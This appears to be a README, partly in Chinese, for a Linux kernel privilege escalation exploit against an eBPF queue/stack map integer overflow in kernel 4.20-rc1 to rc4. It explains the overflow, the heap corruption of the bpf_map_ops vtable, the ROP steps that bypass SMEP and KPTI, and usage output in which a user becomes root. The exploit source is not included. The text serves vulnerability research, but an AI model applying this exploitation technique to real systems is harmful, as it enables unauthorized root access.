# Linux_LPE_eBPF_4.20rc1-4
LPE exploit for 4.20rc1-rc4.  
For educational/research purposes only. Use at your own risk.  
## Analysis
syscall: int bpf(int cmd, union bpf_attr *attr, unsigned int size);
### kernel compilation
	开启下列参数：
		1. CONFIG_BPF
		2. CONFIG_BPF_SYSCALL
		3. CONFIG_DEBUG_INFO
### exploit
#### triggered vul path  
a. 漏洞触发路径：bpf -> map_create -> find_and_alloc_map -> queue_stack_map_alloc。  
#### triggered vul condition
b. 达到漏洞函数的条件。  
```
	1. 设置 attr->map_type 为 22。
	2. 通过 map_alloc_check 的检查。
	3. attr->map_ifindex 为空。
```
#### vul loc
c. 漏洞函数 queue_stack_map_alloc 的漏洞：整数溢出 -> 分配堆空间。  
size变量存在整数溢出。这个size在正常情况下应该是：struct bpf_queue_stac 的大小加上 value_size * size 相当于是map中每一项的大小（value_size）乘项数+1（attr->max_entries + 1）。  
另外，elements后面是数据区域。
```
struct bpf_queue_stack {
    struct bpf_map map;
    raw_spinlock_t lock;
    u32 head, tail;
    u32 size; /* max_entries + 1 */
 
    char elements[0] __aligned(8);
};

/* map is generic key/value storage optionally accessible by eBPF programs */
struct bpf_map_ops {
	/* funcs callable from userspace (via syscall) */
	int (*map_alloc_check)(union bpf_attr *attr);
	struct bpf_map *(*map_alloc)(union bpf_attr *attr);
	void (*map_release)(struct bpf_map *map, struct file *map_file);
	...
}；
struct bpf_map {
    /* The first two cachelines with read-mostly members of which some
     * are also accessed in fast-path (e.g. ops, max_entries).
     */
    const struct bpf_map_ops *ops ____cacheline_aligned;
    struct bpf_map *inner_map_meta;
#ifdef CONFIG_SECURITY
    void *security;
#endif
    enum bpf_map_type map_type;
    u32 key_size;
    u32 value_size;
    u32 max_entries;
    u32 map_flags;
    u32 pages;
    u32 id;
    int numa_node;
    u32 btf_key_type_id;
    u32 btf_value_type_id;
    struct btf *btf;
    bool unpriv_array;
    /* 55 bytes hole */
 
    /* The 3rd and 4th cacheline with misc members to avoid false sharing
     * particularly with refcounting.
     */
    struct user_struct *user ____cacheline_aligned;
    atomic_t refcnt;
    atomic_t usercnt;
    struct work_struct work;
    char name[BPF_OBJ_NAME_LEN];
};

void *bpf_map_area_alloc(size_t size, int numa_node)
{
    ......
  area = kmalloc_node(size, GFP_USER | flags, numa_node);
        if (area != NULL)
            return area;
    ......
}

bpf_map* queue_stack_map_alloc{
......
  struct bpf_queue_stack *qs;   
  u32 size, value_size;
  u64 queue_size, cost;
 
  // bugs-> integer overflow. -> 0
  size = attr->max_entries + 1;
  value_size = attr->value_size;
 
  queue_size = sizeof(*qs) + (u64) value_size * size;
  ......
  qs = bpf_map_area_alloc(queue_size, numa_node); // numa_node存储着attr
  ......
  // 用 bpf_attr 初始化 bpf_map。
  bpf_map_init_from_attr(&qs->map, attr);
  ......
  qs->size = size;
  return &qs->map;
}
```
最后从 find_and_alloc_map(attr) 中返回我们的map（struct bpf_map *）。  
---->  
由于整数溢出，导致只分配了struct bpf_queue_stack 的空间，而没有分配map对应的空间。（个人理解这个bpf_queue_stack类似报文头部（负责管理的），而map对应的空间类似payload（elements数据）），但是map->max_entries = attr->max_entries。  
#### 堆溢出
e. 接下来，我们需要找到一块可以造成堆溢出的位置。我们将视角移出 map_create 函数。然而在BPF_MAP_UPDATE_ELEM 分支中我们对此对象进行更新等操作。  	
触发路径：bpf -> map_update_elem -> queue_stack_map_push_elem.  
```
queue_stack_map_push_elem(struct bpf_map *map, void *value,
                     u64 flags){
......
 dst = &qs->elements[qs->head * qs->map.value_size]; //qs->head代表当前是第几个entry
 memcpy(dst, value, qs->map.value_size); //堆溢出位置     
......
}
```
所以，对于0x100大小的map header+map payload, 即struct bpf_queue_stack，如果我们要拷贝的大小（value_size）大于（0x100- sizeof(bpf_map) - 0x10）的大小，就会造成堆溢出，而value_size由输入参数 attr 控制，从而能覆盖到下一个created map的bpf_map_ops虚表。  
#### vul exploitation
f. 漏洞利用
```
struct bpf_queue_stack {
    struct bpf_map map;
    raw_spinlock_t lock;
    u32 head, tail;
    u32 size; /* max_entries + 1 */
 
    char elements[0] __aligned(8);
};

struct bpf_map {
    /* The first two cachelines with read-mostly members of which some
     * are also accessed in fast-path (e.g. ops, max_entries).
     */
    const struct bpf_map_ops *ops ____cacheline_aligned;
  ......
}
```
1. 看到其第一个成员就是虚表指针 ops ，换句话说，在我们kamlloc出的slab中的第一个位置就是指向当前map虚表的指针。
2. 如果我们能通过上方的slab堆溢出，劫持下方slab的虚表指针，再fake相应的vtable，就可以实现一套内核的执行流劫持。
3. 最终的攻击点我们选择在在fake vtable上伪造fake map_release函数指针，通过close对应的map id触发fake bpf_map_release完成执行流劫持。

##### bypass smep
1. 使用了这样一条在内核中常用的栈迁移gadgets：xchg eax esp; ret;。将该gadget直接放到用户态mmap出来的fake ops table上。
2. rop劫持cr4绕过smep，然后ret2usr 提升权限。
3. 最后 swapgs; iretq 着陆用户态起shell。

但是这样是没法bypass smap的，因为ret指令涉及到向用户态取数据。

##### bypass kpti
使用kernel rop和swapgs_restore_regs_and_return_to_usermode绕过kpti。  
1. kernel rop用于提权。  
2. swapgs_restore_regs_and_return_to_usermode 安全切换到用户态。  

## Todo
### bypass smap
### bypass kaslr

## Usage
Build for 4.20rc1-rc4.  
```
$ make
```
To run:  
由于当前版本没绕过kaslr，需要手动修改exp的gadget地址以匹配你的内核。
```
# id
uid=1000(tmp) gid=1000(tmp) groups=1000(tmp)
$ /exp                                                                                          
[+] sizeof(union bpf_attr): 0x48
[+] sizeof(struct bpf_map): 0xc0          
[+] sizeof(struct bpf_queue_stack): 0x100
[+] bpf targetFd: 3
[+] map fd: 4
[+] set fake bpf_map_ops table.
[+] set kernel rop.
[+] fake_rsp: 8100e7f8
[+] start closing map fd
[*] welcome to root :-)
$ id
uid=0(root) gid=0(root)
```
Note: Just a toy. Improve the mitigation please. 
